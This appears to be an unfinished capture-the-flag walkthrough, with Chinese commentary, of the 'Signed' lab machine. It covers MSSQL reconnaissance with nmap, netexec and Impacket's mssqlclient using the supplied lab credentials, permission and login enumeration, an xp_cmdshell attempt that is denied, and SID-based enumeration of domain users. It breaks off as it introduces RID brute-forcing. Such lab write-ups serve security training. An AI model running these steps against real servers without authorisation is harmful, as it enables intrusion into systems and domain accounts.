## Signed
```
[★]$ nmap -sCV 10.129.242.173
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-19 03:47 CDT
Nmap scan report for 10.129.242.173
Host is up (0.0083s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-19T08:45:44
|_Not valid after:  2056-03-19T08:45:44
|_ssl-date: 2026-03-19T08:47:55+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds
[★]$ echo '10.129.242.173 dc01.signed.htb signed.htb' | sudo tee -a /etc/hosts
10.129.242.173 dc01.signed.htb signed.htb
```
#### Machine Information
```
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
```
#### 枚举
```
[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH'  //域账户（Domain Account）
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth    //本地账户（Local Account）
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
```
#### 添加主机名
```
[★]$ sudo sed -i '$ s/$/ dc01/' /etc/hosts
```
#### 将使用 Impacket 连接mssqlclient.py到MSSQL
```
[★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> select @@version;  //全局变量@@version显示版本信息
                                                                                                                                                                                                                             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
	Oct  8 2022 05:58:25 
	Copyright (C) 2022 Microsoft Corporation
	Developer Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (scott  guest@master)> 
```
#### 提示信息显示 scott 用户拥有访客角色，并且默认数据库是 master 数据库。我可以明确地获取有关已登录用户的更多信息：
```
SQL (scott  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
                
-----   -----   
scott   scott   

SQL (scott  guest@master)> 
```
#### ORIGINAL_LOGIN()它提供已通过 MSSQL 身份验证的用户信息，以及SUSER_SNAME()映射到当前安全上下文的用户信息。在本例中，这两个用户是同一个人，但使用一个帐户登录可能会映射到 MSSQL 中的另一个用户。要明确查看权限，我可以同时检查服务器级和数据库级权限：
```
SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE   

SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION
```
#### 在 MSSQL 枚举中，有一套“固定套路”：
```
常用函数包括：
fn_my_permissions 👉 看当前权限（⭐你现在用的）
SYSTEM_USER
IS_SRVROLEMEMBER
HAS_PERMS_BY_NAME
👉 这些属于：
MSSQL Enumeration Cheat Sheet（必背)
```
#### 这些数据库就是默认数据库：查询 sys.databases它是 MSSQL 里专门用来列出所有数据库的系统视图
```
SQL (scott  guest@master)> SELECT  name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb
```
#### 由于没有什么有趣的数据可供查看，我将检查以下内容xp_cmdshell：
```
SQL (scott  guest@master)> xp_cmdshell whoami
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```
#### 该功能已被禁用，Scott 没有权限启用它。
#### 我会检查是否存在身份冒用和关联服务器，但这两项检查都没有发现任何异常：
```
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (scott  guest@master)> 
```
#### 该输出确认了当前服务器名称为 DC01，我也可以通过以下命令看到@@SERVERNAME：
```
SQL (scott  guest@master)> select @@SERVERNAME;
       
----   
DC01   

```
#### 列出登录名，只有 scott 和 sa（管理员）帐户：
#### mssqlclient.py enum_logins 命令 提供的快捷枚举命令，查询服务器角色权限
```
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0   

scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0   
```
#### sa = MSSQL 默认超级管理员 ｜ is_disabled: 0 → 没被禁用 ｜ sysadmin: 1 → ⭐ 最高权限
#### xp_dirtree这将允许我枚举文件系统。我可以尝试读取以下内容C:\：
```
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   file   
------------   -----   ----
```
#### 看起来 scott 可以运行该命令，但没有读取任何文件的权限。
### 域用户
#### MSSQL 提供了获取域用户信息的机制。例如，我可以查找域管理员帐户的 SID：
```
SQL (scott  guest@master)> SELECT SUSER_SID('SIGNED\Administrator');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'   

```
#### 也可以反其道而行之：
```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000);
                       
--------------------   
SIGNED\Administrator   

```
#### 此 SID 为二进制格式，但 0xf4010000 是小端十六进制的 RID 500。如果我想查看哪些设备拥有 501 (0xf5010000)，MSSQL 将显示：
```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f5010000);
               
------------   
SIGNED\Guest   

```
#### SUSER_SNAME 函数作用把 SID（二进制）转换成“用户名”
#### 域：SIGNED 用户：Guest | SID 枚举 / 用户识别（User Enumeration via SID）
#### 幸好，netexec它提供了一个--rid-brute可以删除用户的选项：
